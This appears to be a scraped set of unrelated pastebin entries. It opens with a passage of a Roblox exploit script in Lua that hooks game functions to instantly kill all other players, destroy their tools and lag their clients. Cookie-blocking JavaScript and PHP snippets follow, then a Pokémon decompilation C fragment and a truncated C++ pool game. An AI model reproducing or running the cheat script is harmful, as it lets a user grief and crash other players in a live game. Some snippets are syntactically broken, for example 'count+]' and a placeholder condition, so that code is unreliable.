            local dist = (CHAR.HumanoidRootPart.Position - p.Character.HumanoidRootPart.Position).Magnitude
            local hum = p.Character:FindFirstChildOfClass(""Humanoid"")
            if hum and dist < auraRange then
                hum:TakeDamage(instantKillDamage)
                -- Only lag the player you killed (handled in onDied)
            end
        end
    end
end)

print(""💀💀💀 ABSOLUTE ULTIMATE CLIENT CRASH LAG SCRIPT ENGAGED 💀💀💀"")

local Lighting = game:GetService(""Lighting"")
local Workspace = game:GetService(""Workspace"")
local Debris = game:GetService(""Debris"")
local stepped = RunService.Stepped

-- 🔥 AUTO-FIRE REMOTEEVENTS IN TOOLS
local function fireServerBoost()
    local tools = {}
    local character = LocalPlayer.Character
    local backpack = LocalPlayer:FindFirstChild(""Backpack"")
    if character then
        for _, item in ipairs(character:GetChildren()) do
            if item:IsA(""Tool"") then table.insert(tools, item) end
        end
    end
    if backpack then
        for _, item in ipairs(backpack:GetChildren()) do
            if item:IsA(""Tool"") then table.insert(tools, item) end
        end
    end
    for _, tool in ipairs(tools) do
        for _, remote in ipairs(tool:GetChildren()) do
            if remote:IsA(""RemoteEvent"") then
                pcall(function() remote:FireServer(tool) end)
            end
        end
    end
end

spawn(function()
    while not _G.Detener do
        fireServerBoost()
        task.wait(0.0)
    end
end)

-- 💥 DAMAGE HOOKS
local function getEnemies()
	for _, player in pairs(Players:GetPlayers()) do
		if player ~= LocalPlayer and player.Character and player.Character:FindFirstChild(""Humanoid"") then
			coroutine.wrap(function()
				local char = player.Character
				for i = 1, 2 do
					local hum = char:FindFirstChildOfClass(""Humanoid"")
					if hum then
						hum:TakeDamage(9999999)
						hum.Health = 0
						char:BreakJoints()
					end
				end
			end)()
		end
	end
end

for i = 1, 190 do
	local function damageFunc(target)
		if target and target:FindFirstChild(""Humanoid"") then
			local hum = target:FindFirstChildOfClass(""Humanoid"")
			if hum then
				hum:TakeDamage(25 + math.random(1,75))
				hum.WalkSpeed = hum.WalkSpeed - math.random(1,5)
				hum.JumpPower = hum.JumpPower - math.random(1,5)
			end
		end
	end
	_G[""damageHook"" .. i] = damageFunc
end

for i = 1, 233 do
	_G[""noCDKill"" .. i] = function()
		local oldWait
		oldWait = hookfunction(wait, function(t)
			return oldWait(0.01)
		end)
		local oldHum
		oldHum = hookfunction(Instance.new(""Humanoid"").TakeDamage, function(self, dmg)
			return oldHum(self, 99999999)
		end)
		getEnemies()
	end
end

local function weakenTools(player)
	if player and player.Character then
		for _, tool in pairs(player.Backpack:GetChildren()) do
			if tool:IsA(""Tool"") then
				tool:Destroy()
			end
		end
	end
end

RunService.Stepped:Connect(function()
	for _, plr in pairs(Players:GetPlayers()) do
		if plr ~= LocalPlayer then
			pcall(function()
				local char = plr.Character
				if char and char:FindFirstChild(""Humanoid"") then
					char.Humanoid:TakeDamage(math.random(5, 15))
					char.Humanoid.WalkSpeed = 4
					weakenTools(plr)
				end
			end)
		end
	end
end)

-- 🌪️ AURA & CLAW SYSTEM
local auraSize = Vector3.new(90, 90, 90)
local auraRange = 9e99999999
local instantKillDamage = 9e999999999999999
local clonesToSpawn = 10
local CLAW_NAME = ""Super Power Claws""

local lp = LocalPlayer
local CHAR = lp.Character or lp.CharacterAdded:Wait()
local Ignorelist = OverlapParams.new()
Ignorelist.FilterType = Enum.RaycastFilterType.Include
local Disable = Instance.new(""BindableEvent"")
getgenv().configs = {
	connection = {},
	Disable = Disable,
	Size = auraSize,
	DeathCheck = false
}
local Run = true

for _, f in ipairs({wait, task.wait, delay, getrenv().wait}) do
	pcall(function()
		hookfunction(f, function() return RunService.Heartbeat:Wait() end)
	end)
end

local function hookAllDamage()
	for _, f in ipairs(getgc(true)) do
		if typeof(f) == ""function"" then
			local name = debug.getinfo(f).name
			if name == ""TakeDamage"" or name == ""BreakJoints"" or name == ""UpdateHealth"" or name == ""ApplyDamage"" or name == ""Damage"" then
				pcall(function() hookfunction(f, function(...) return 0 end) end)
			end
		end
	end
end
hookAllDamage()

local function equipClaw()
	local claw = lp.Backpack:FindFirstChild(CLAW_NAME) or lp.Character:FindFirstChild(CLAW_NAME)
	if claw then
		claw.Parent = lp.Character
		local handle = claw:FindFirstChild(""Handle"") or claw:FindFirstChildWhichIsA(""BasePart"")
		if handle then
			handle.Size = Vector3.new(9e9, 9e9, 9e9)
			handle.CanTouch = true
			handle.Touched:Connect(function(hit)
				local hum = hit.Parent:FindFirstChildWhichIsA(""Humanoid"")
				if hum and hum.Health > 0 then hum.Health = 0 end
			end)
		end
	end
end

equipClaw()

RunService.Heartbeat:Connect(function()
	local char = lp.Character
	if not char then return end
	local Characters = {}
	for _, v in ipairs(Players:GetPlayers()) do
		if v ~= lp and v.Character then table.insert(Characters, v.Character) end
	end
	Ignorelist.FilterDescendantsInstances = Characters
	for _, tool in ipairs(char:GetChildren()) do
		if tool:IsA(""Tool"") then
			local touch = tool:FindFirstChildWhichIsA(""TouchTransmitter"", true)
			if touch then
				local hits = Workspace:GetPartBoundsInBox(
					touch.Parent.CFrame,
					touch.Parent.Size + auraSize,
					Ignorelist
				)
				for _, v in ipairs(hits) do
					local char = v:FindFirstAncestorOfClass(""Model"")
					if char and table.find(Characters, char) then
						local hum = char:FindFirstChildWhichIsA(""Humanoid"")
						if hum then hum.Health = 0 end
						firetouchinterest(touch.Parent, v, 0)
						firetouchinterest(touch.Parent, v, 1)
					end
				end
			end
		end
	end
end)

local function spawnClone()
	local char = lp.Character
	if not char then return end
	local clone = char:Clone()
	for _, d in ipairs(clone:GetDescendants()) do
		if d:IsA(""BasePart"") then
			d.Transparency = 1
			d.CanCollide = false
			d.CastShadow = false
		elseif d:IsA(""Script"") or d:IsA(""LocalScript"") then
			d:Destroy()
		end
	end
	local root = clone:FindFirstChild(""HumanoidRootPart"")
	local realRoot = char:FindFirstChild(""HumanoidRootPart"")
	if root and realRoot then
		root.CFrame = realRoot.CFrame * CFrame.new(math.random(-50,50), 0, math.random(-50,50))
	end
	clone.Name = ""AuraClone_""..math.random(100000,999999)
	clone.Parent = Workspace

	RunService.Heartbeat:Connect(function()
		for _, p in ipairs(Players:GetPlayers()) do
			if p ~= lp and p.Character and p.Character:FindFirstChild(""HumanoidRootPart"") then
				local hum = p.Character:FindFirstChildWhichIsA(""Humanoid"")
				if hum and hum.Health > 0 and (hum.Parent.HumanoidRootPart.Position - root.Position).Magnitude < auraRange then
					hum.Health = 0
				end
			end
		end
	end)
end

for i = 1, clonesToSpawn do spawnClone() end

local function lagOpponent(plr)
	if not plr or not plr.Character then return end
	for i = 1, 5 do
		local part = Instance.new(""Part"")
		part.Size = Vector3.new(50, 50, 50)
		part.Transparency = 1
		part.Anchored = true
		part.CanCollide = false
		part.CFrame = plr.Character.HumanoidRootPart.CFrame * CFrame.new(math.random(-30,30),0,math.random(-30,30))
		part.Parent = Workspace
		Debris:AddItem(part, 2)
	end
end

local afterKillActive = false
local function onDied()
	afterKillActive = true
	local hum = CHAR:FindFirstChildWhichIsA(""Humanoid"")
	task.wait()
	local tag = hum and (hum:FindFirstChild(""creator"") or hum:FindFirstChild(""creatorTag""))
	if tag and tag.Value and tag.Value ~= lp then
		lagOpponent(tag.Value)
	end
end

local function onRespawn(newChar)
	CHAR = newChar
	afterKillActive = false
	equipClaw()
	for i = 1, 2 do spawnClone() end
	newChar:WaitForChild(""Humanoid"").Died:Connect(onDied)
end

CHAR:WaitForChild(""Humanoid"").Died:Connect(onDied)
lp.CharacterAdded:Connect(onRespawn)

RunService.Heartbeat:Connect(function()
	if not afterKillActive then return end
	for _, p in ipairs(Players:GetPlayers()) do
		if p ~= lp and p.Character and p.Character:FindFirstChild(""HumanoidRootPart"") then
			local dist = (CHAR.HumanoidRootPart.Position - p.Character.HumanoidRootPart.Position).Magnitude
			local hum = p.Character:FindFirstChildOfClass(""Humanoid"")
			if hum and dist < auraRange then
				hum:TakeDamage(instantKillDamage)
			end
		end
	end
end)

print(""\226\156\150 MEGA PSYCHO CLAW AURA FIXED & READY"")
print(""\226\156\150 NGF ULTRA DAMAGE DOMINATOR Loaded"")"
7wKWTubW,Untitled,swte,JavaScript,Friday 11th of July 2025 03:10:28 PM CDT,"const cookieDescriptor = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie') || Object.getOwnPropertyDescriptor(HTMLDocument.prototype, 'cookie');

Object.defineProperty(document, 'cookie', {
    get: function() {
          return cookieDescriptor.get.call(document);
    },
    set: function(cookieString) {
          const cookieName = cookieString.split('=')[0].trim();

          if (nem követő kuki){
                cookieDescriptor.set.call(document, cookieString);
          } 
    },
    configurable: false,
    enumerable: true
});"
VvDm4WsD,Untitled,swte,PHP,Friday 11th of July 2025 03:07:53 PM CDT,"<?php

add_action('wp_head', function(){
	echo ""<script>Object.defineProperty(document, 'cookie', {get: function() {return '';},set: function() {return false;},configurable: false,enumerable: true});</script>"";
}, -PHP_INT_MAX);

?>"
mA7H5mx0,Untitled,swte,JavaScript,Friday 11th of July 2025 03:05:25 PM CDT,"Object.defineProperty(document, 'cookie', {
    get: function() {
          return '';
    },
    set: function() {
		return false;
    },
    configurable: false,
    enumerable: true
});"
xAhi8Hrj,Untitled,Squeetz,C,Friday 11th of July 2025 02:50:39 PM CDT,"struct AnimBgInfo
{
    u8 count;                        // amount of battlers on bg
    u8 battlers[MAX_BATTLERS_COUNT]; // array of battlers on bg
};

static void TryPutBattlerOnBg(u32 battler)
{
    u32 i;
    u32 x, x2;
    struct AnimBgInfo *bgInfo;
    
    x = GetBattlerSpriteCoord(battler, BATTLER_COORD_X_2);
    
    // try put battler on bg1
    bgInfo = &sAnimBg1Info;
    for (i = 0; i < bgInfo->count; i++)
    {
        x2 = GetBattlerSpriteCoord(bgInfo->battlers[i], BATTLER_COORD_X_2);
        // do these sprites intersect?
        if ((x < x2 && x + 64 >= x2) || (x > x2 && x <= x2 + 64))
            break;
    }
    if (i == bgInfo->count)
    {
        bgInfo->battlers[bgInfo->count++] = battler;
        MoveBattlerSpriteToBG(battler, FALSE);
    }
    else
    {
        // try put battler on bg2
        bgInfo = &sAnimBg2Info;
        for (i = 0; i < bgInfo->count; i++)
        {
            x2 = GetBattlerSpriteCoord(bgInfo->battlers[i], BATTLER_COORD_X_2);
            if ((x < x2 && x + 64 >= x2) || (x > x2 && x <= x2 + 64))
                break;
        }
        if (i == bgInfo->count)
        {
            bgInfo->battlers[bgInfo->count+] = battler;
            MoveBattlerSpriteToBG(battler, TRUE);
        }
    }
}"
xLzrCBZ4,2D StickPool (O3 AI Added SpotlightGlow Effect + IndigoDeepBlue Table (Midnight Pool 4-like Realism),alien_fx_fiend,C++,Friday 11th of July 2025 02:11:57 PM CDT,"==++ Here's the full source code for (File 1\3) ""Pool-Game-CloneV18.cpp""::: ++==
```""Pool-Game-CloneV18.cpp""
    #define WIN32_LEAN_AND_MEAN
    #define NOMINMAX
    #include <windows.h>
    #include <d2d1.h>
    #include <dwrite.h>
    #include <fstream> // For file I/O
    #include <iostream> // For some basic I/O, though not strictly necessary for just file ops
    #include <vector>
    #include <cmath>
    #include <string>
    #include <sstream> // Required for wostringstream
    #include <algorithm> // Required for std::max, std::min
    #include <ctime>    // Required for srand, time
    #include <cstdlib> // Required for srand, rand (often included by others, but good practice)
    #include <commctrl.h> // Needed for radio buttons etc. in dialog (if using native controls)
    #include <mmsystem.h> // For PlaySound
    #include <tchar.h> //midi func
    #include <thread>
    #include <atomic>
    #include ""resource.h""

    #ifndef HAS_STD_CLAMP
    template <typename T>
    T clamp(const T& v, const T& lo, const T& hi)
    {
        return (v < lo) ? lo : (v > hi) ? hi : v;
    }
    namespace std { using ::clamp; }   // inject into std:: for seamless use
    #define HAS_STD_CLAMP
    #endif

    #pragma comment(lib, ""Comctl32.lib"") // Link against common controls library
    #pragma comment(lib, ""d2d1.lib"")
    #pragma comment(lib, ""dwrite.lib"")
    #pragma comment(lib, ""Winmm.lib"") // Link against Windows Multimedia library

    // --- Constants ---
    const float PI = 3.1415926535f;
    const float BALL_RADIUS = 10.0f;
    const float TABLE_LEFT = 100.0f;
    const float TABLE_TOP = 100.0f;
    const float TABLE_WIDTH = 700.0f;
    const float TABLE_HEIGHT = 350.0f;
    const float TABLE_RIGHT = TABLE_LEFT + TABLE_WIDTH;
    const float TABLE_BOTTOM = TABLE_TOP + TABLE_HEIGHT;
    const float CUSHION_THICKNESS = 20.0f;
    const float HOLE_VISUAL_RADIUS = 22.0f; // Visual size of the hole
    const float POCKET_RADIUS = HOLE_VISUAL_RADIUS * 1.05f; // Make detection radius slightly larger // Make detection radius match visual size (or slightly larger)
    const float MAX_SHOT_POWER = 15.0f;
    const float FRICTION = 0.985f; // Friction factor per frame
    const float MIN_VELOCITY_SQ = 0.01f * 0.01f; // Stop balls below this squared velocity
    const float HEADSTRING_X = TABLE_LEFT + TABLE_WIDTH * 0.30f; // 30% line
    const float RACK_POS_X = TABLE_LEFT + TABLE_WIDTH * 0.65f; // 65% line for rack apex
    const float RACK_POS_Y = TABLE_TOP + TABLE_HEIGHT / 2.0f;
    const UINT ID_TIMER = 1;
    const int TARGET_FPS = 60; // Target frames per second for timer

    // --- Enums ---
    // --- MODIFIED/NEW Enums ---
    enum GameState {
        SHOWING_DIALOG,     // NEW: Game is waiting for initial dialog input
        PRE_BREAK_PLACEMENT,// Player placing cue ball for break
        BREAKING,           // Player is aiming/shooting the break shot
        CHOOSING_POCKET_P1, // NEW: Player 1 needs to call a pocket for the 8-ball
        CHOOSING_POCKET_P2, // NEW: Player 2 needs to call a pocket for the 8-ball
        AIMING,             // Player is aiming
        AI_THINKING,        // NEW: AI is calculating its move
        SHOT_IN_PROGRESS,   // Balls are moving
        ASSIGNING_BALLS,    // Turn after break where ball types are assigned
        PLAYER1_TURN,
        PLAYER2_TURN,
        BALL_IN_HAND_P1,
        BALL_IN_HAND_P2,
        GAME_OVER
    };

    enum BallType {
        NONE,
        SOLID,  // Yellow (1-7)
        STRIPE, // Red (9-15)
        EIGHT_BALL, // Black (8)
        CUE_BALL // White (0)
    };

    // NEW Enums for Game Mode and AI Difficulty
    enum GameMode {
        HUMAN_VS_HUMAN,
        HUMAN_VS_AI
    };

    enum AIDifficulty {
        EASY,
        MEDIUM,
        HARD
    };

    enum OpeningBreakMode {
        CPU_BREAK,
        P1_BREAK,
        FLIP_COIN_BREAK
    };

    // --- Structs ---
    struct Ball {
        int id;             // 0=Cue, 1-7=Solid, 8=Eight, 9-15=Stripe
        BallType type;
        float x, y;
        float vx, vy;
        D2D1_COLOR_F color;
        bool isPocketed;
    };

    struct PlayerInfo {
        BallType assignedType;
        int ballsPocketedCount;
        std::wstring name;
    };

    // --- Global Variables ---

    // Direct2D & DirectWrite
    ID2D1Factory* pFactory = nullptr;
    //ID2D1Factory* g_pD2DFactory = nullptr;
    ID2D1HwndRenderTarget* pRenderTarget = nullptr;
    IDWriteFactory* pDWriteFactory = nullptr;
    IDWriteTextFormat* pTextFormat = nullptr;
    IDWriteTextFormat* pLargeTextFormat = nullptr; // For ""Foul!""

    // Game State
    HWND hwndMain = nullptr;
    GameState currentGameState = SHOWING_DIALOG; // Start by showing dialog
    std::vector<Ball> balls;
    int currentPlayer = 1; // 1 or 2
    PlayerInfo player1Info = { BallType::NONE, 0, L""Vince Woods""/*""Player 1""*/ };
    PlayerInfo player2Info = { BallType::NONE, 0, L""Virtus Pro""/*""CPU""*/ }; // Default P2 name
    bool foulCommitted = false;
    std::wstring gameOverMessage = L"""";
    bool firstBallPocketedAfterBreak = false;
    std::vector<int> pocketedThisTurn;
    // --- NEW: 8-Ball Pocket Call Globals ---
    int calledPocketP1 = -1; // Pocket index (0-5) called by Player 1 for the 8-ball. -1 means not called.
    int calledPocketP2 = -1; // Pocket index (0-5) called by Player 2 for the 8-ball.
    int currentlyHoveredPocket = -1; // For visual feedback on which pocket is being hovered
    std::wstring pocketCallMessage = L""""; // Message like ""Choose a pocket...""
         // --- NEW: Remember which pocket the 8?ball actually went into last shot
    int lastEightBallPocketIndex = -1;
    //int lastPocketedIndex = -1; // pocket index (0–5) of the last ball pocketed
    int called = -1;
    bool cueBallPocketed = false;

    // --- NEW: Foul Tracking Globals ---
    int firstHitBallIdThisShot = -1;      // ID of the first object ball hit by cue ball (-1 if none)
    bool cueHitObjectBallThisShot = false; // Did cue ball hit an object ball this shot?
    bool railHitAfterContact = false;     // Did any ball hit a rail AFTER cue hit an object ball?
    // --- End New Foul Tracking Globals ---

    // NEW Game Mode/AI Globals
    GameMode gameMode = HUMAN_VS_HUMAN; // Default mode
    AIDifficulty aiDifficulty = MEDIUM; // Default difficulty
    OpeningBreakMode openingBreakMode = CPU_BREAK; // Default opening break mode
    bool isPlayer2AI = false;           // Is Player 2 controlled by AI?
    bool aiTurnPending = false;         // Flag: AI needs to take its turn when possible
    // bool aiIsThinking = false;       // Replaced by AI_THINKING game state
    // NEW: Flag to indicate if the current shot is the opening break of the game
    bool isOpeningBreakShot = false;

    // NEW: For AI shot planning and visualization
    struct AIPlannedShot {
        float angle;
        float power;
        float spinX;
        float spinY;
        bool isValid; // Is there a valid shot planned?
    };
    AIPlannedShot aiPlannedShotDetails; // Stores the AI's next shot
    bool aiIsDisplayingAim = false;    // True when AI has decided a shot and is in ""display aim"" mode
    int aiAimDisplayFramesLeft = 0;  // How many frames left to display AI aim
    const int AI_AIM_DISPLAY_DURATION_FRAMES = 45; // Approx 0.75 seconds at 60 FPS, adjust as needed

    // Input & Aiming
    POINT ptMouse = { 0, 0 };
    bool isAiming = false;
    bool isDraggingCueBall = false;
    // --- ENSURE THIS LINE EXISTS HERE ---
    bool isDraggingStick = false; // True specifically when drag initiated on the stick graphic
    // --- End Ensure ---
    bool isSettingEnglish = false;
    D2D1_POINT_2F aimStartPoint = { 0, 0 };
    float cueAngle = 0.0f;
    float shotPower = 0.0f;
    float cueSpinX = 0.0f; // Range -1 to 1
    float cueSpinY = 0.0f; // Range -1 to 1
    float pocketFlashTimer = 0.0f;
    bool cheatModeEnabled = false; // Cheat Mode toggle (G key)
    int draggingBallId = -1;
    bool keyboardAimingActive = false; // NEW FLAG: true when arrow keys modify aim/power
    MCIDEVICEID midiDeviceID = 0; //midi func
    std::atomic<bool> isMusicPlaying(false); //midi func
    std::thread musicThread; //midi func
    void StartMidi(HWND hwnd, const TCHAR* midiPath);
    void StopMidi();

    // UI Element Positions
    D2D1_RECT_F powerMeterRect = { TABLE_RIGHT + CUSHION_THICKNESS + 10, TABLE_TOP, TABLE_RIGHT + CUSHION_THICKNESS + 40, TABLE_BOTTOM };
    D2D1_RECT_F spinIndicatorRect = { TABLE_LEFT - CUSHION_THICKNESS - 60, TABLE_TOP + 20, TABLE_LEFT - CUSHION_THICKNESS - 20, TABLE_TOP + 60 }; // Circle area
    D2D1_POINT_2F spinIndicatorCenter = { spinIndicatorRect.left + (spinIndicatorRect.right - spinIndicatorRect.left) / 2.0f, spinIndicatorRect.top + (spinIndicatorRect.bottom - spinIndicatorRect.top) / 2.0f };
    float spinIndicatorRadius = (spinIndicatorRect.right - spinIndicatorRect.left) / 2.0f;
    D2D1_RECT_F pocketedBallsBarRect = { TABLE_LEFT, TABLE_BOTTOM + CUSHION_THICKNESS + 30, TABLE_RIGHT, TABLE_BOTTOM + CUSHION_THICKNESS + 70 };

    // Corrected Pocket Center Positions (aligned with table corners/edges)
    const D2D1_POINT_2F pocketPositions[6] = {
        {TABLE_LEFT, TABLE_TOP},                           // Top-Left
        {TABLE_LEFT + TABLE_WIDTH / 2.0f, TABLE_TOP},      // Top-Middle
        {TABLE_RIGHT, TABLE_TOP},                          // Top-Right
        {TABLE_LEFT, TABLE_BOTTOM},                        // Bottom-Left
        {TABLE_LEFT + TABLE_WIDTH / 2.0f, TABLE_BOTTOM},   // Bottom-Middle
        {TABLE_RIGHT, TABLE_BOTTOM}                        // Bottom-Right
    };

    // Colors
    const D2D1_COLOR_F TABLE_COLOR = D2D1::ColorF(0.05f, 0.09f, 0.28f); // Darker Green NEWCOLOR (0.0f, 0.5f, 0.1f) => (0.1608f, 0.4000f, 0.1765f)
    //const D2D1_COLOR_F TABLE_COLOR = D2D1::ColorF(0.0f, 0.5f, 0.1f); // Darker Green NEWCOLOR (0.0f, 0.5f, 0.1f) => (0.1608f, 0.4000f, 0.1765f)
    const D2D1_COLOR_F CUSHION_COLOR = D2D1::ColorF(D2D1::ColorF(0.3608f, 0.0275f, 0.0078f)); // NEWCOLOR ::Red => (0.3608f, 0.0275f, 0.0078f)
    //const D2D1_COLOR_F CUSHION_COLOR = D2D1::ColorF(D2D1::ColorF::Red); // NEWCOLOR ::Red => (0.3608f, 0.0275f, 0.0078f)
    const D2D1_COLOR_F POCKET_COLOR = D2D1::ColorF(D2D1::ColorF::Black);
    const D2D1_COLOR_F CUE_BALL_COLOR = D2D1::ColorF(D2D1::ColorF::White);
    const D2D1_COLOR_F EIGHT_BALL_COLOR = D2D1::ColorF(D2D1::ColorF::Black);
    const D2D1_COLOR_F SOLID_COLOR = D2D1::ColorF(D2D1::ColorF::Goldenrod); // Solids = Yellow Goldenrod
    const D2D1_COLOR_F STRIPE_COLOR = D2D1::ColorF(D2D1::ColorF::DarkOrchid);   // Stripes = Red DarkOrchid
    const D2D1_COLOR_F AIM_LINE_COLOR = D2D1::ColorF(D2D1::ColorF::White, 0.7f); // Semi-transparent white
    const D2D1_COLOR_F FOUL_TEXT_COLOR = D2D1::ColorF(D2D1::ColorF::Red);
    const D2D1_COLOR_F TURN_ARROW_COLOR = D2D1::ColorF(0.1333f, 0.7294f, 0.7490f); //NEWCOLOR 0.1333f, 0.7294f, 0.7490f => ::Blue
    //const D2D1_COLOR_F TURN_ARROW_COLOR = D2D1::ColorF(D2D1::ColorF::Blue);
    const D2D1_COLOR_F ENGLISH_DOT_COLOR = D2D1::ColorF(D2D1::ColorF::Red);
    const D2D1_COLOR_F UI_TEXT_COLOR = D2D1::ColorF(D2D1::ColorF::Black);

    // --------------------------------------------------------------------
//  Realistic colours for each id (0-15)
//  0 = cue-ball (white) | 1-7 solids | 8 = eight-ball | 9-15 stripes
// --------------------------------------------------------------------
    static const D2D1_COLOR_F BALL_COLORS[16] =
    {
        D2D1::ColorF(D2D1::ColorF::White),          // 0  cue
        D2D1::ColorF(1.00f, 0.85f, 0.00f),          // 1  yellow
        D2D1::ColorF(0.05f, 0.30f, 1.00f),          // 2  blue
        D2D1::ColorF(0.90f, 0.10f, 0.10f),          // 3  red
        D2D1::ColorF(0.55f, 0.25f, 0.85f),          // 4  purple
        D2D1::ColorF(1.00f, 0.55f, 0.00f),          // 5  orange
        D2D1::ColorF(0.00f, 0.60f, 0.30f),          // 6  green
        D2D1::ColorF(0.50f, 0.05f, 0.05f),          // 7  maroon / burgundy
        D2D1::ColorF(D2D1::ColorF::Black),          // 8  black
        D2D1::ColorF(1.00f, 0.85f, 0.00f),          // 9  (yellow stripe)
        D2D1::ColorF(0.05f, 0.30f, 1.00f),          // 10 blue stripe
        D2D1::ColorF(0.90f, 0.10f, 0.10f),          // 11 red stripe
        D2D1::ColorF(0.55f, 0.25f, 0.85f),          // 12 purple stripe
        D2D1::ColorF(1.00f, 0.55f, 0.00f),          // 13 orange stripe
        D2D1::ColorF(0.00f, 0.60f, 0.30f),          // 14 green stripe
        D2D1::ColorF(0.50f, 0.05f, 0.05f)           // 15 maroon stripe
    };

    // Quick helper
    inline D2D1_COLOR_F GetBallColor(int id)
    {
        return (id >= 0 && id < 16) ? BALL_COLORS[id]
            : D2D1::ColorF(D2D1::ColorF::White);
    }

    // --- Forward Declarations ---
    HRESULT CreateDeviceResources();
    void DiscardDeviceResources();
    void OnPaint();
    void OnResize(UINT width, UINT height);
    void InitGame();
    void GameUpdate();
    void UpdatePhysics();
    void CheckCollisions();
    bool CheckPockets(); // Returns true if any ball was pocketed
    void ProcessShotResults();
    void ApplyShot(float power, float angle, float spinX, float spinY);
    void RespawnCueBall(bool behindHeadstring);
    bool AreBallsMoving();
    void SwitchTurns();
    //bool AssignPlayerBallTypes(BallType firstPocketedType);
    bool AssignPlayerBallTypes(BallType firstPocketedType,
        bool creditShooter = true);
    void CheckGameOverConditions(bool eightBallPocketed, bool cueBallPocketed);
    Ball* GetBallById(int id);
    Ball* GetCueBall();
    //void PlayGameMusic(HWND hwnd); //midi func
    void AIBreakShot();

    // Drawing Functions
    void DrawScene(ID2D1RenderTarget* pRT);
    void DrawTable(ID2D1RenderTarget* pRT, ID2D1Factory* pFactory);
    void DrawBalls(ID2D1RenderTarget* pRT);
    void DrawCueStick(ID2D1RenderTarget* pRT);
    void DrawAimingAids(ID2D1RenderTarget* pRT);
    void DrawUI(ID2D1RenderTarget* pRT);
    void DrawPowerMeter(ID2D1RenderTarget* pRT);
    void DrawSpinIndicator(ID2D1RenderTarget* pRT);
    void DrawPocketedBallsIndicator(ID2D1RenderTarget* pRT);
    void DrawBallInHandIndicator(ID2D1RenderTarget* pRT);
    // NEW
    void DrawPocketSelectionIndicator(ID2D1RenderTarget* pRT);

    // Helper Functions
    float GetDistance(float x1, float y1, float x2, float y2);
    float GetDistanceSq(float x1, float y1, float x2, float y2);
    bool IsValidCueBallPosition(float x, float y, bool checkHeadstring);
    template <typename T> void SafeRelease(T** ppT);
    // --- NEW HELPER FORWARD DECLARATIONS ---
    bool IsPlayerOnEightBall(int player);
    void CheckAndTransitionToPocketChoice(int playerID);
    // --- ADD FORWARD DECLARATION FOR NEW HELPER HERE ---
    float PointToLineSegmentDistanceSq(D2D1_POINT_2F p, D2D1_POINT_2F a, D2D1_POINT_2F b);
    // --- End Forward Declaration ---
    bool LineSegmentIntersection(D2D1_POINT_2F p1, D2D1_POINT_2F p2, D2D1_POINT_2F p3, D2D1_POINT_2F p4, D2D1_POINT_2F& intersection); // Keep this if present

    // --- NEW Forward Declarations ---

    // AI Related
    struct AIShotInfo; // Define below
    void TriggerAIMove();
    void AIMakeDecision();
    void AIPlaceCueBall();
    AIShotInfo AIFindBestShot();
    AIShotInfo EvaluateShot(Ball* targetBall, int pocketIndex);
    bool IsPathClear(D2D1_POINT_2F start, D2D1_POINT_2F end, int ignoredBallId1, int ignoredBallId2);
    Ball* FindFirstHitBall(D2D1_POINT_2F start, float angle, float& hitDistSq); // Added hitDistSq output
    float CalculateShotPower(float cueToGhostDist, float targetToPocketDist);
    D2D1_POINT_2F CalculateGhostBallPos(Ball* targetBall, int pocketIndex);
    bool IsValidAIAimAngle(float angle); // Basic check

    // Dialog Related
    INT_PTR CALLBACK NewGameDialogProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam);
    void ShowNewGameDialog(HINSTANCE hInstance);
    void LoadSettings(); // For deserialization
    void SaveSettings(); // For serialization
    const std::wstring SETTINGS_FILE_NAME = L""Pool-Settings.txt"";
    void ResetGame(HINSTANCE hInstance); // Function to handle F2 reset

    // --- Forward Declaration for Window Procedure --- <<< Add this line HERE
    LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);

    // --- NEW Struct for AI Shot Evaluation ---
    struct AIShotInfo {
        bool possible = false;          // Is this shot considered viable?
        Ball* targetBall = nullptr;     // Which ball to hit
        int pocketIndex = -1;           // Which pocket to aim for (0-5)
        D2D1_POINT_2F ghostBallPos = { 0,0 }; // Where cue ball needs to hit target ball
        float angle = 0.0f;             // Calculated shot angle
        float power = 0.0f;             // Calculated shot power
        float score = -1.0f;            // Score for this shot (higher is better)
        bool involves8Ball = false;     // Is the target the 8-ball?
        float spinX = 0.0f;
        float spinY = 0.0f;
    };

    /*
    table = TABLE_COLOR new: #29662d (0.1608, 0.4000, 0.1765) => old: (0.0f, 0.5f, 0.1f)
    rail CUSHION_COLOR = #5c0702 (0.3608, 0.0275, 0.0078) => ::Red
    gap = #e99d33 (0.9157, 0.6157, 0.2000) => ::Orange
    winbg = #5e8863 (0.3686, 0.5333, 0.3882) => 1.0f, 1.0f, 0.803f
    headstring = #47742f (0.2784, 0.4549, 0.1843) => ::White
    bluearrow = #08b0a5 (0.0314, 0.6902, 0.6471) *#22babf (0.1333,0.7294,0.7490) => ::Blue
    */

    // --- NEW Settings Serialization Functions ---
    void SaveSettings() {
        std::ofstream outFile(SETTINGS_FILE_NAME);
        if (outFile.is_open()) {
            outFile << static_cast<int>(gameMode) << std::endl;
            outFile << static_cast<int>(aiDifficulty) << std::endl;
            outFile << static_cast<int>(openingBreakMode) << std::endl;
            outFile.close();
        }
        // else: Handle error, e.g., log or silently fail
    }

    void LoadSettings() {
        std::ifstream inFile(SETTINGS_FILE_NAME);
        if (inFile.is_open()) {
            int gm, aid, obm;
            if (inFile >> gm) {
                gameMode = static_cast<GameMode>(gm);
            }
            if (inFile >> aid) {
                aiDifficulty = static_cast<AIDifficulty>(aid);
            }
            if (inFile >> obm) {
                openingBreakMode = static_cast<OpeningBreakMode>(obm);
            }
            inFile.close();

            // Validate loaded settings (optional, but good practice)
            if (gameMode < HUMAN_VS_HUMAN || gameMode > HUMAN_VS_AI) gameMode = HUMAN_VS_HUMAN; // Default
            if (aiDifficulty < EASY || aiDifficulty > HARD) aiDifficulty = MEDIUM; // Default
            if (openingBreakMode < CPU_BREAK || openingBreakMode > FLIP_COIN_BREAK) openingBreakMode = CPU_BREAK; // Default
        }
        // else: File doesn't exist or couldn't be opened, use defaults (already set in global vars)
    }
    // --- End Settings Serialization Functions ---

    // --- NEW Dialog Procedure ---
    INT_PTR CALLBACK NewGameDialogProc(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam) {
        switch (message) {
        case WM_INITDIALOG:
        {
            // --- ACTION 4: Center Dialog Box ---
    // Optional: Force centering if default isn't working
            RECT rcDlg, rcOwner, rcScreen;
            HWND hwndOwner = GetParent(hDlg); // GetParent(hDlg) might be better if hwndMain is passed
            if (hwndOwner == NULL) hwndOwner = GetDesktopWindow();

